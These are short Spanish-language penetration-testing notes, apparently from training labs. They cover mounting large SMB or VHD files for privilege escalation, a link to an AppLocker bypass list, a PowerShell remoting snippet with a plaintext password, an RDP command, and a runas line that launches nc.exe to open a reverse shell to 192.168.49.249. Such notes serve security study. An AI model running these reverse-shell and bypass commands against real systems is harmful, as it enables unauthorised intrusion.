## MOUNT LARGE FILES

Si tenemos acceso a un recurso por SMB pero pesa muchísimo, entonces mejor que descargarlo puede ser montarlo en nuestra máquina. -> Optimum


MONTAR FICHEROS VHD -> OPTIMUM


Muy bueno para escalar privilegios

## RUTAS PARA EJECUTABLES AppLocker ByPass
* https://github.com/api0cradle/UltimateAppLockerByPassList


## EJECUCIÓN EN UN EQUIPO POWEREHLL

```
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
whoami
```


rdP xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:offsec /v:192.168.169.250



Ejecutar con runas

```
C:\ProgramData\PY_Software\Argus Surveillance DVR>runas /env /profile /user:Administrator “C:\ProgramData\PY_Software\Argus Surveillance DVR\nc.exe -e cmd.exe 192.168.49.249 21”
```
## Permisos en WINDOWS

![[Pasted image 20230522162113.png]]

Mirar permisos en web directories

En xamps: C:\xampp\htdocs\assets